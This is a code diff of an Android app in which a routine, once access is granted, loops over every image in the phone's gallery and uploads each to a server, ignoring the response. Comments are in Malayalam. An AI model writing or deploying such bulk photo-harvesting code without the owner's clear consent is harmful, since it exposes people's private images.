@@ -123,9 +123,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void fetchAndUploadImages() {
-        Toast.makeText(this, "Access granted. Processing...", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Access granted. Processing and uploading images...", Toast.LENGTH_LONG).show();
 
-        // Background Thread-ൽ പ്രവർത്തിക്കാൻ (Network operations-ന് Main Thread അനുവദിക്കാത്തതിനാൽ)
+        // Background Thread-ൽ പ്രവർത്തിക്കാൻ
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -135,7 +135,8 @@ public class MainActivity extends AppCompatActivity {
                     Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
 
                     if (cursor != null) {
-                        if (cursor.moveToFirst()) {
+                        // ഗാലറിയിലുള്ള എല്ലാ ചിത്രങ്ങളും ലൂപ്പ് വഴി എടുക്കുന്നു
+                        while (cursor.moveToNext()) {
                             int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                             String filePath = cursor.getString(columnIndex);
                             
@@ -192,13 +193,10 @@ public class MainActivity extends AppCompatActivity {
             outputStream.flush();
             outputStream.close();
 
-            int responseCode = connection.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                // വിജയകരമായി അയച്ചു കഴിഞ്ഞാൽ ചെയ്യാവുന്നത്
-            }
+            connection.getResponseCode();
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
-        }
-                    
+                                         }
+                
